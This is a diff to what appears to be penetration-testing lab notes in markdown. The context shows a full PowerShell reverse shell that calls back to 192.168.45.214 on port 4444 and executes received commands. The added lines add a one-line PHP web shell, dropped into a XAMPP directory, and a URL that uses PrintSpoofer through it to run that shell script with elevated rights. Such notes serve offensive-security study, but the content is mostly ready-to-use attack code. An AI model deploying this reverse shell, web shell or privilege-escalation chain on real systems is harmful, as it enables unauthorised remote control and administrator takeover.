@@ -2396,6 +2396,19 @@ End Sub
 ```powershell
 $client = New-Object System.Net.Sockets.TCPClient('192.168.45.214',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
+- In this C:\xmapp uploaded the cmd.php
+- To get Administrator Access with above powershell script
+```powershell
+#cmd.php in kali
+cat cmd.php   
+<pre>
+<?php
+system($_GET['cmd']);
+?>
+</pre>
+# Get admin access
+http://192.168.104.169/cmd.php?cmd=C:\xampp\htdocs\PrintSpoofer64.exe -c "cmd /c powershell -c C:\Windows\Tasks\offsec.ps1"
+```
 
 ### Powershell run command
 - Run the PowerShell command
